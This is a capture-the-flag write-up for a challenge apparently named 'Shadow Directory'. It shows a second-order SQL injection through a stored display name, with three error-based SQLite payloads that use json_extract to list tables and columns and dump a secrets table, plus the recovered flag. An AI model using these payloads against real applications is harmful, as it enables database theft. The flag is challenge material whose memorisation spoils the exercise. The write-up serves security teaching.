## Shadow Directory — Second-Order SQL Injection

The profile page lets us save a display name, which is later used by the `/colleagues` endpoint. This makes it a second-order SQL injection.

I started with `' ORDER BY 3--` and got an error saying the query only had two columns. Testing `sqlite_version()` confirmed SQLite.

Since UNION payloads weren't working, I used SQLite's `json_extract()` to trigger errors that reflected database values.

First, enumerated the tables:

```sql
' ORDER BY json_extract('{}',(SELECT group_concat(name,',') FROM sqlite_master WHERE type='table'))--
```

This revealed `users` and `secrets`.

Then enumerated the columns in `secrets`:

```sql
' ORDER BY json_extract('{}',(SELECT group_concat(name,',') FROM pragma_table_info('secrets')))--
```

Got `id,name,value`.

Finally, extracted the secret:

```sql
' ORDER BY json_extract('{}',(SELECT group_concat(name||':'||value,' | ') FROM secrets))--
```

The database error leaked the flag:

**`crest{sec0nd_0rder_1nj3ct10n_sh4d0w}`**
